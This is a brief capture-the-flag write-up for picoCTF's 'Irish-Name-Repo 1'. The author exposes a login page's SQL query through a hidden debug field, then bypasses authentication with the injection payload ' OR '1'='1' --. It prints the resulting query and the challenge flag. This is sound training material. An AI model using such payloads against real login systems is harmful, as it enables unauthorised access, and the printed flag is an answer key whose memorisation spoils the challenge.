### [Irish-Name-Repo 1](https://play.picoctf.org/practice/challenge/80)

This challenge is based on a basic SQL injection. When I landed on the website, I immediately looked for a login page. It was present at this page:

    https://jupiter.challenges.picoctf.org/problem/33850/login.php

Once I am here, I inspected the page any possible hints. There I came across a hidden field named `debug` whose value was `0`. I changed it to `1` and tried to login with random credentials. What I got is:

    username: eee
    password: eee
    SQL query: SELECT * FROM users WHERE name='eee' AND password='eee'

    Login failed.

From here, it is basic SQL injection. My payload was:

    ' OR '1'='1' --

Once I injected it, I was able to login. This is what I got:

    username: eee
    password: ' OR '1'='1' --
    SQL query: SELECT * FROM users WHERE name='eee' AND password='' OR '1'='1' --'

    Logged in!

    Your flag is: picoCTF{s0m3_SQL_f8adf3fb}

Flag: `picoCTF{s0m3_SQL_f8adf3fb}`
